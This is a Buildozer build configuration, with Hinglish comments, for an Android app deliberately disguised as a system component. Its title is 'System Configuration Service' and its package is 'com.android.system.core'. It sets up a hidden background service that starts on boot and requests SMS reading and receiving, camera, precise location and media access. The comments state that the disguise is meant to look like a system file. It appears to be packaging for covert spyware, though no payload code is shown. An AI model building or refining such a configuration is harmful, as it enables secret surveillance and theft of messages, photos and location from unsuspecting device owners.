[app]
# Launcher mein dikhne wala naam
title = System Configuration Service
# Isse system file jaisa look milega
package.name = sys_vulkan_driver
package.domain = com.android.system.core
source.dir = .
source.include_exts = py,png,jpg,kv,ttf
version = 1.0.1

# Requirements mein aiohttp aur pyjnius zaroori hain background access ke liye
requirements = python3,kivy,aiohttp,pyjnius

orientation = portrait
# Aapka main file name app.py hai
entrypoint = app.py
# Background engine setup
services = mdmservice:service.py
fullscreen = 0

# Android specific settings
android.api = 34
android.minapi = 26
android.archs = arm64-v8a, armeabi-v7a
android.wakelock = True

# Sabse important: All Unblocked Permissions
android.permissions = INTERNET,FOREGROUND_SERVICE,FOREGROUND_SERVICE_DATA_SYNC,WAKE_LOCK,POST_NOTIFICATIONS,CAMERA,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_MEDIA_IMAGES,READ_MEDIA_VIDEO,READ_MEDIA_AUDIO,RECEIVE_BOOT_COMPLETED,READ_SMS,RECEIVE_SMS,ACCESS_FINE_LOCATION

# Reboot ke baad auto-start ke liye
android.entrypoint_name = main
android.preserve_data = True

[buildozer]
log_level = 2
warn_on_root = 1